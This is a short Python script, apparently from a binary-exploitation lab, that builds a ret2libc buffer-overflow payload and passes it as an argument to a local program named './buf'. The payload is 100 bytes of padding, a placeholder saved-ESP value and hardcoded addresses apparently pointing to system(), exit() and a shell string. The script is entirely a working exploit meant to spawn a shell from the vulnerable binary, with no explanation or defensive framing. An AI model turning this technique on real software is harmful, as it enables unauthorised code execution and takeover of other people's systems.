from subprocess import call

JUNK = 'A' * 100
ESP4 = 'BBBB'
SYSTEM = '\xe0\x06\xe1\xf7'
EXIT = '\x50\x2e\xe0\xf7'
SHELL = '\x08\x01\xf6\xf7'

PAYLOAD = JUNK + ESP4 + SYSTEM + EXIT + SHELL

print(PAYLOAD)

# exec program with final payload as arg
call(['./buf', PAYLOAD])